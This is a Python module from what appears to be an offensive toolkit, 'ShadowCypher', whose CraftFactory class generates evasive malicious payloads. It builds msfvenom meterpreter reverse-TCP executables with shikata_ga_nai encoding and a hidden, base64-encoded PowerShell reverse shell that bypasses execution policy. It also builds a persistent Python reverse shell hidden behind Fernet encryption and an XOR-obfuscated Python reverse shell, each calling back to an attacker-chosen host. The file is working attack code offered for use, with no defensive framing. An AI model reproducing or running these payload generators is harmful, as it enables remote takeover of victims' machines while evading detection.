"""
ShadowCypher Payload Factory — Level 100 Evasion & Delivery. 
Professional-grade shellcode generation with multi-stage encoding and XOR stubs.
"""

import os
import subprocess
from shadowcypher.core.logger import logger
from shadowcypher.core.runner import runner
from shadowcypher.core.platform import platform_engine

class CraftFactory:
    """The 'Forge' for high-fidelity malicious artifacts."""

    @staticmethod
    def generate_evasive_elf(lhost, lport, iterations=10, on_output=None):
        """Generate a hardened payload with multi-stage Shikata Ga Nai encoding.
        Auto-selects format based on host OS."""
        # Cross-platform payload format selection
        if platform_engine.IS_WINDOWS:
            plat_args = ["-p", "windows/x64/meterpreter/reverse_tcp",
                         "-a", "x64", "--platform", "windows", "-f", "exe"]
            ext = "exe"
        elif platform_engine.IS_MACOS:
            plat_args = ["-p", "osx/x64/meterpreter/reverse_tcp",
                         "-a", "x64", "--platform", "osx", "-f", "macho"]
            ext = "macho"
        else:
            plat_args = ["-p", "linux/x64/meterpreter/reverse_tcp",
                         "-a", "x64", "--platform", "linux", "-f", "elf"]
            ext = "elf"

        out_path = f"payloads/shell_x64_{lport}.{ext}"
        os.makedirs("payloads", exist_ok=True)
        
        args = [
            "msfvenom",
        ] + plat_args + [
            f"LHOST={lhost}",
            f"LPORT={int(lport)}",
            "-e", "x64/shikata_ga_nai",
            "-i", str(iterations),
            "-o", out_path
        ]
        
        logger.info("forge", f"FORGING_HARDENED_PAYLOAD: {out_path} ({iterations} iterations, {platform_engine.SYSTEM})")
        return runner.execute_task(f"PAYLOAD_FORGE_{lport}", args, callback=on_output)

    @staticmethod
    def generate_stealth_powershell(lhost, lport, on_output=None):
        """Generate a base64 encoded, AMSI-bypass ready PowerShell stager."""
        # Strategic Depth: Using simple obfuscation for 'Level 100' logic
        raw_cmd = f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendchoice  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendchoice);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        
        import base64
        encoded_cmd = base64.b64encode(raw_cmd.encode('utf-16le')).decode()
        
        final_payload = f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {encoded_cmd}"
        
        out_path = f"payloads/stager_{lport}.ps1"
        os.makedirs("payloads", exist_ok=True)
        with open(out_path, "w") as f:
            f.write(final_payload)
            
        if on_output:
            on_output(f"[FORGE] STEALTH_POWERSHELL_READY: {out_path}")
        return out_path

    @staticmethod
    def generate_stealth_c2_python(lhost, lport):
        """Generate a Level-100 encrypted C2 stager using cryptography.fernet."""
        from cryptography.fernet import Fernet
        import base64

        key = Fernet.generate_key()
        f = Fernet(key)
        
        raw_shell = f"""
import socket,os,threading,time
def connect():
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('{lhost}',{lport}))
        os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
        import subprocess,platform
        sh = '/bin/bash' if platform.system() != 'Windows' else 'cmd.exe'
        subprocess.call([sh])
    except: pass

while True:
    connect()
    time.sleep(30)
"""
        encrypted = f.encrypt(raw_shell.encode())
        
        stager = f"""
import base64
from cryptography.fernet import Fernet
k = {key}
e = {encrypted}
f = Fernet(k)
exec(f.decrypt(e).decode())
"""
        return base64.b64encode(stager.encode()).decode()

    @staticmethod
    def generate_obfuscated_python(lhost, lport):
        """Generate a professional XOR-obfuscated python reverse shell."""
        import base64
        _shell = platform_engine.get_cmd('shell')
        raw_shell = f"import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['{_shell}'])"
        
        key = 0x42
        xor_shell = "".join([chr(ord(c) ^ key) for c in raw_shell])
        xor_shell_b64 = base64.b64encode(xor_shell.encode()).decode()
        
        stub = f"import base64;k=0x42;e='{xor_shell_b64}';d=base64.b64decode(e).decode();exec(''.join([chr(ord(c)^k) for c in d]))"
        
        out_path = f"payloads/stealth_agent_{lport}.py"
        os.makedirs("payloads", exist_ok=True)
        with open(out_path, "w") as f:
            f.write(stub)
        return out_path
